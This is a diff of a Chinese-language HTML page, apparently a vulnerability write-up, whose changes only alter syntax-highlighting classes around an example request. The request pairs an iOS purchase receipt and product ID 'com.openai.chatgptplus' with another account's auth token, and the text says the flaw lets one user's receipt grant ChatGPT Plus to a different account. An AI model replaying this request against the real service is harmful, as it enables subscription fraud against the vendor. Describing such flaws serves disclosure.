@@ -894,13 +894,13 @@
 <span class="token header"><span class="token header-name keyword">Authorization</span><span class="token punctuation">:</span> <span class="token header-value">Bearer &lt;目标账号的 auth token&gt;</span></span>
 <span class="token application-json">
 <span class="token punctuation">{</span>
-  <span class="token string-property property">"receipt"</span><span class="token operator">:</span> <span class="token string">"&lt;Base64 编码的 iOS 收据&gt;"</span><span class="token punctuation">,</span>
-  <span class="token string-property property">"platform"</span><span class="token operator">:</span> <span class="token string">"ios"</span><span class="token punctuation">,</span>
-  <span class="token string-property property">"product_id"</span><span class="token operator">:</span> <span class="token string">"com.openai.chatgptplus"</span><span class="token punctuation">,</span>
-  <span class="token string-property property">"device_info"</span><span class="token operator">:</span> <span class="token punctuation">{</span>
-    <span class="token string-property property">"model"</span><span class="token operator">:</span> <span class="token string">"iPhone14,2"</span><span class="token punctuation">,</span>
-    <span class="token string-property property">"os_version"</span><span class="token operator">:</span> <span class="token string">"17.0"</span><span class="token punctuation">,</span>
-    <span class="token string-property property">"timezone"</span><span class="token operator">:</span> <span class="token string">"Asia/Shanghai"</span>
+  <span class="token property">"receipt"</span><span class="token operator">:</span> <span class="token string">"&lt;Base64 编码的 iOS 收据&gt;"</span><span class="token punctuation">,</span>
+  <span class="token property">"platform"</span><span class="token operator">:</span> <span class="token string">"ios"</span><span class="token punctuation">,</span>
+  <span class="token property">"product_id"</span><span class="token operator">:</span> <span class="token string">"com.openai.chatgptplus"</span><span class="token punctuation">,</span>
+  <span class="token property">"device_info"</span><span class="token operator">:</span> <span class="token punctuation">{</span>
+    <span class="token property">"model"</span><span class="token operator">:</span> <span class="token string">"iPhone14,2"</span><span class="token punctuation">,</span>
+    <span class="token property">"os_version"</span><span class="token operator">:</span> <span class="token string">"17.0"</span><span class="token punctuation">,</span>
+    <span class="token property">"timezone"</span><span class="token operator">:</span> <span class="token string">"Asia/Shanghai"</span>
   <span class="token punctuation">}</span>
 <span class="token punctuation">}</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 <p><strong>注意这里的关键点</strong>：<code>Authorization</code> 头使用的是<strong>目标用户</strong>的 auth token，而不是购买者的。这就是漏洞的核心利用方式——用 A 的收据给 B 开通 Plus。</p>
